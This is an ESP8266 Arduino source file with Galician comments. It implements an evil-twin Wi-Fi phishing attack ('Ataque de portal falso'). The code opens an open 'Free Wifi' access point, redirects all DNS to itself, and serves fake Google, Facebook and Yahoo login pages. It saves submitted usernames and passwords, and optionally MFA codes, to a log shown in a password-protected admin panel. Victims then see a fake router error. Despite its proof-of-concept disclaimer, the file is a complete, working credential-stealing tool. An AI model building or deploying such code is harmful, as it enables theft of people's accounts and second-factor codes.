/*
 * Orixinal de Corey Harding, editado por G. R. Casanova
 * www.legacysecuritygroup.com
 * Editado por Ivan Romero Zas
 * Configura o nome do punto de acceso e ata 3 dominios personalizados e URLs de inicio de sesión en config.h
 * Configura o HTML para a páxina de inicio de sesión dos devanditos dominios en site1.h, site2.h e site3.h
 * Configura o HTML para calquera outro dominio (catch-all) en site_other.h
 * Isto é só unha proba de concepto. Non me fago responsable das túas accións.
 * Cumpre todas as leis locais, estatais, federais e internacionais!
*/

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include "google.h"
#include "facebook.h"
#include "yahoo.h"
#include "styles.h" // Inclúe o ficheiro de estilos novo

// Incluir as bibliotecas de Crypto e SHA256
#include <Crypto.h>
#include <SHA256.h>
#define SHA256_SIZE 32 
#define LOGFILE "/log.txt"

const char *ssid = "Free Wifi";

#define captivePortalPage GOOGLE_HTML

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String webString = "";
String serialString = "";
String pendingCredentials = ""; // Almacena as credenciais pendentes de verificación

//ATENCIÓN: se alguén desexase probar este código debería cambiar o hash seguinte, cun contrasinal
//          calquera unido ao salt inferior. 
const char* hashed_password = "aa3c881e748f5772970e52dcb308837104174140c526c35efb253112b0485ea6"; 
const char* salt = "opgIKEvy1nS2p"; 

// Variable para activar/desactivar o modo de verificación de código
bool codeVerificationMode = false; // Por defecto desactivado

// Función para calcular o hash SHA256
String calculateHash(const char* input, const char* salt) {
    String salted_input = String(input) + String(salt);
    uint8_t hash[SHA256_SIZE]; // Array para almacenar o hash resultante

    SHA256 sha256; // Crear un obxecto SHA256
    sha256.reset(); // Reiniciar o obxecto SHA256
    sha256.update((const uint8_t*)salted_input.c_str(), salted_input.length()); // Engadir a entrada ao hash
    sha256.finalize(hash, SHA256_SIZE); // Finalizar o cálculo do hash

    // Converter o hash a unha cadea hexadecimal
    String hashStr = "";
    for (int i = 0; i < SHA256_SIZE; i++) {
        char buf[3];
        sprintf(buf, "%02x", hash[i]); // Formato hexadecimal de 2 díxitos
        hashStr += buf;
    }

    return hashStr;
}

// Función para verificar o contrasinal
bool checkPassword(const char* input_password) {
    String input_hash = calculateHash(input_password, salt);
    return input_hash == hashed_password;
}

void blink(int n) {
  for (int i = 0; i < n; i++) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(250);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(250);
  }
}

void setup() {
  Serial.begin(9600);
  Serial.println();
  Serial.println("V3.0.0 - Ataque de portal falso");
  Serial.println();

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  
  Serial.print("AVISO: o sistema pode tardar entre 1/2 minutos en entrar nun modo COMPLETAMENTE operativo.");
  Serial.println("Recoméndase refrescar/reabrir unha pestana do navegador se tardase moito.");
  Serial.println("Inicializando sistema de ficheiros...");
  SPIFFS.begin();
  Serial.println("Sistema de ficheiros inicializado exitosamente!");
  Serial.print("Buscando arquivo log.txt...");
  File f = SPIFFS.open(LOGFILE, "r");

  if (!f) {
    Serial.print(" Arquivo non encontrado. \nFormateando e creando novo log.txt...");
    SPIFFS.format();
    File f = SPIFFS.open(LOGFILE, "w");
    if (!f) {
      Serial.println("Erro na creación dun novo log.txt!");
    }
    f.println("Credenciais de acceso capturadas:");
  }
  f.close();
  Serial.println("Busqueda e apertura de log.txt exitosa!");

  Serial.print("Levantando punto de acceso...");
  WiFi.setOutputPower(20.5);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);
  delay(500);
  Serial.println("Punto de acceso levantando exitosamente!");

  Serial.print("Levantando servidor DNS...");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("Servidor DNS levantado exitosamente!");

  webServer.on("/", handleRoot);
  webServer.on("/generate_204", handleRoot);
  webServer.on("/fwlink", handleRoot);
  webServer.onNotFound(handleRoot);

  webServer.on("/validate", []() {
    String url = webServer.arg("url");
    String user = webServer.arg("user");
    String pass = webServer.arg("pass");

    serialString = url + ":" + user + ":" + pass;
    Serial.println(serialString);

    if (codeVerificationMode) {
      // Gardar as credenciais inmediatamente
      File f = SPIFFS.open(LOGFILE, "a");
      if (f) {
        f.println(serialString); // Gardar en formato URL:usuario:contrasinal
        f.close();
      }

      // Almacenar as credenciais pendentes de verificación
      pendingCredentials = serialString;

      // Redirixir á pantalla de verificación de código
      webString = R"=====(
        <html>
          <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>)====="+ String(VERIFICATION_CODE_STYLE) + R"=====(</style>
          </head>
          <body>
            <h1>Introduce o código de verificación</h1>
            <form action='/verify_code' method='POST'>
              <input type='hidden' name='url' value=')=====" + url + R"=====('>
              <input type='hidden' name='user' value=')=====" + user + R"=====('>
              <input type='hidden' name='pass' value=')=====" + pass + R"=====('>
              <input type='text' name='code' placeholder='Código de verificación' required>
              <input type='submit' value='Acceder'>
            </form>
          </body>
        </html>
      )=====";
      webServer.send(200, "text/html", webString);
    } else {
      // Gardar as credenciais directamente (modo de verificación desactivado)
      File f = SPIFFS.open(LOGFILE, "a");
      if (f) {
        f.println(serialString);
        f.close();
      }

      webString = "<h1>#E701 - Router Configuration Error</h1>";
      webServer.send(500, "text/html", webString);

      serialString = "";
      webString = "";

      blink(5);
    }
  });

  webServer.on("/verify_code", []() {
    String url = webServer.arg("url");
    String user = webServer.arg("user");
    String pass = webServer.arg("pass");
    String code = webServer.arg("code");

    // Crear a cadea de credenciais para comparar
    String currentCredentials = url + ":" + user + ":" + pass;

    // Verificar se as credenciais coinciden coas pendentes
    if (currentCredentials == pendingCredentials) {
      // Ler o arquivo log.txt
      File f = SPIFFS.open(LOGFILE, "r");
      String fileContent = "";
      if (f) {
        while (f.available()) {
          String line = f.readStringUntil('\n');
          line.trim(); // Eliminar espazos en branco ou saltos de liña adicionais
          if (line == pendingCredentials) {
            // Engadir o código á liña correspondente
            line += ":" + code;
          }
          fileContent += line + "\n"; // Engadir a liña ao contido do arquivo
        }
        f.close();
      }

      // Sobrescribir o arquivo log.txt co contido actualizado
      f = SPIFFS.open(LOGFILE, "w");
      if (f) {
        f.print(fileContent); // Escribir o contido actualizado
        f.close();
      }

      // Mostrar o código na consola serie
      Serial.println("Code Verification Mode: ON");
      Serial.println("Code obtained: " + code);

      // Mostrar a mensaxe de erro (sempre se mostra)
      webString = "<h1>#E701 - Router Configuration Error</h1>";
      webServer.send(500, "text/html", webString);

      serialString = "";
      webString = "";

      blink(5); // Indicación visual de que se gardou o código
    } else {
      // Credenciais non coinciden, mostrar unha mensaxe de erro
      webString = "<html><body><h1>Invalid credentials</h1><br><a href='/'>Try again</a></body></html>";
      webServer.send(401, "text/html", webString);
    }
  });

  webServer.on("/logs", []() {
    // Verificar se se enviou un contrasinal
    if (webServer.hasArg("password")) {
      String password = webServer.arg("password");
      if (checkPassword(password.c_str())) {
        // Contrasinal correcto, mostrar os logs
        String webString = R"=====(
          <html>
            <head>
              <title>Panel de administración</title>
              <style>)====="+ String(ADMIN_PANEL_STYLE) + R"=====(</style>
            </head>
            <body>
              <h1>Credenciais capturadas</h1>
              <pre>
        )=====";

        // Ler e mostrar o contido do arquivo log.txt
        File f = SPIFFS.open(LOGFILE, "r");
        if (f) {
          webString += f.readString();
          f.close();
        } else {
          webString += "Erro durante a lectura dos logs";
        }

        webString += R"=====(
              </pre>
              <div class="button-container">
                <button onclick="window.location.href='/logs/clear'">Eliminar logs</button>
                <button onclick="window.location.href='/logs/toggle_code_verification'">)=====";
        webString += codeVerificationMode ? "Desactivar solicitude de MFA" : "Activar solicitude de MFA";
        webString += R"=====(</button>
                <button class="refresh" onclick="window.location.href='/logs'">Refrescar</button>
              </div>
            </body>
          </html>
        )=====";

        webServer.send(200, "text/html", webString);
      } else {
        // Contrasinal incorrecto, mostrar unha mensaxe de erro
        webString = "<html><body><h1>Contrasinal incorrecto</h1><br><a href='/logs'>Volve a introducir o contrasinal</a></body></html>";
        webServer.send(401, "text/html", webString);
      }
    } else {
      // Mostrar o formulario para ingresar o contrasinal
      webString = R"=====(
        <html>
          <head>
            <style>)=====" + String(PASSWORD_FORM_STYLE) + R"=====(</style>
          </head>
          <body>
            <h1>Introduce o contrasinal</h1>
            <form action='/logs' method='POST'>
              <input type='password' name='password' placeholder='Contrasinal'>
              <input type='submit' value='Acceder'>
            </form>
          </body>
        </html>
      )=====";
      webServer.send(200, "text/html", webString);
    }
  });

  webServer.on("/logs/toggle_code_verification", []() {
    codeVerificationMode = !codeVerificationMode;
    String webString = R"=====(
      <html>
        <head>
          <title>Modo de código de verificación</title>
          <style>)=====" + String(TOGGLE_MODE_STYLE) + R"=====(</style>
        </head>
        <body>
          <h1>Modo de solicitude de MFA  )=====";
    webString += codeVerificationMode ? "activado" : "desactivado";
    webString += R"=====(</h1>
          <div class="button-container">
            <button onclick="window.location.href='/logs'">Regreso</button>
          </div>
        </body>
      </html>
    )=====";
    webServer.send(200, "text/html", webString);

    // Mostrar o estado do modo na consola serie
    Serial.println("Solicitar código de verificación: " + String(codeVerificationMode ? "ON" : "OFF"));
  });

  webServer.on("/logs/clear", []() {
    // Verificar se se enviou un contrasinal
    if (webServer.hasArg("password")) {
      String password = webServer.arg("password");
      if (checkPassword(password.c_str())) {
        // Contrasinal correcto, borrar os logs
        File f = SPIFFS.open(LOGFILE, "w");
        if (f) {
          f.println("Credenciais de acceso capturadas:");
          f.close();
        }

        String webString = R"=====(
          <html>
            <head>
              <title>Eliminar logs</title>
              <style>)=====" + String(CLEAR_LOGS_STYLE) + R"=====(</style>
            </head>
            <body>
              <h1>Todos os logs foron eliminados</h1>
              <div class="button-container">
                <button onclick="window.location.href='/logs'">Regreso</button>
              </div>
            </body>
          </html>
        )=====";
        webServer.send(200, "text/html", webString);
      } else {
        // Contrasinal incorrecto, mostrar unha mensaxe de erro
        String webString = R"=====(
          <html>
            <head>
              <style>)=====" + String(ERROR_STYLE) + R"=====(</style>
            </head>
            <body>
              <h1>Contrasinal incorrecto</h1>
              <br>
              <a href='/logs/clear'>Volve a introducir o contrasinal</a>
            </body>
          </html>
        )=====";
        webServer.send(401, "text/html", webString);
      }
    } else {
      // Mostrar o formulario para ingresar o contrasinal
      String webString = R"=====(
        <html>
          <head>
            <style>)=====" + String(PASSWORD_FORM_STYLE) + R"=====(</style>
          </head>
          <body>
            <h1>Introduce o contrasinal</h1>
            <form action='/logs/clear' method='POST'>
              <input type='password' name='password' placeholder='Contrasinal'>
              <input type='submit' value='Acceder'>
            </form>
          </body>
        </html>
      )=====";
      webServer.send(200, "text/html", webString);
    }
  });

  Serial.print("Iniciando servidor web...");
  webServer.begin();
  Serial.println(" Servidor iniciado con éxito!");

  blink(10);

  Serial.println("Dispositivo operativo!");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void handleRoot() {
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");

  webServer.send(200, "text/html", captivePortalPage);
}
